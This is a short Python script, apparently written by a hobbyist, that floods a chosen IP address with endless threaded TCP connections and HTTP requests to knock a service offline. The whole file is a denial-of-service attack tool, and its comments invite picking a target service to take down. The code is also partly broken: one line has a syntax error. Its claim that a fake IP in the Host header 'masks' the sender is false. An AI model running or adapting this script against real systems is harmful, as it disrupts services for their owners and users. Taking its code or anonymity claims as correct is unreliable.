"""
Created by: Elvin Rivera
10/28/2020
Description: script to simulate a DDoS on a service



NOTE: Python does not support true multithreading

"""


import threading # used to thread
import socket # used to connect

target = '10.0.0.23' #choose the IP to DDoS, or a domain name (used router but in this script i'm using arbitrary IP, default gateway IPConfig)
port = 80 #over https, depends on what service you want to take down, can take down Port 22
fake_ip = '173.32.30.20' #mask your IP

already_connected = 0 #

#endless loop
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create new internet socket and specify protocol (TCP)
        s.connect((target, port)) #tuple
        s.sendto(("GET /" + target + "HTTP/1.1\r\n")encode('ascii'), (target, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close() #close the connection , connect -> close repeat

        #to check connections
        global already_connected
        already_connected +=1
        ## print(already_connected) #dont print everything
        if already_connected % 500 == 0:
            print(already_connected)

#define your thread/threat
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
                                                           
